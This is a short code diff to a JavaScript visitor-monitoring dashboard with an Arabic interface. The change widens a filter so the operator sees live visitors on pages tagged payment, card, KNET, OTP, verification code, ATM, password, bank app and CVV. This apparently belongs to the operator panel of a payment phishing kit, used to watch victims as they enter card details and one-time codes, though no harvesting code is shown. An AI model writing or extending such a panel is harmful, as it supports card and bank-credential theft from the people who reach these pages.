@@ -1530,16 +1530,19 @@
         return getLastActivity(b) - getLastActivity(a);
       });
       if (visitorTab === 'summary') {
+        const _kw = ['ملخص','summary','دفع','payment','بطاقة','card','كي نت','knet','otp','رمز التحقق','atm','كلمة مرور','تطبيق البنك','bank-app','طلب إشعار','cvv','النهائية','final'];
         for (let i = list.length - 1; i >= 0; i--) {
-          const pg = list[i].page || '';
-          if (!pg.includes('ملخص') && !pg.toLowerCase().includes('summary')) list.splice(i, 1);
+          const pg = (list[i].page || '').toLowerCase();
+          let ok = false;
+          for (let k = 0; k < _kw.length; k++) { if (pg.indexOf(_kw[k]) !== -1) { ok = true; break; } }
+          if (!ok) list.splice(i, 1);
         }
       }
       const connectedCount = list.filter(v => v.isConnected === true).length;
       visitorCount.textContent = connectedCount + ' نشط / ' + list.length + ' زائر';
 
       if (list.length === 0) {
-        visitorsList.innerHTML = '<p class="text-gray-500 text-center py-8">' + (visitorTab === 'summary' ? 'لا يوجد زوار في صفحة الملخص' : 'لا يوجد زوار حالياً') + '</p>';
+        visitorsList.innerHTML = '<p class="text-gray-500 text-center py-8">' + (visitorTab === 'summary' ? 'لا يوجد زوار في الملخص أو ما بعده' : 'لا يوجد زوار حالياً') + '</p>';
         return;
       }
 
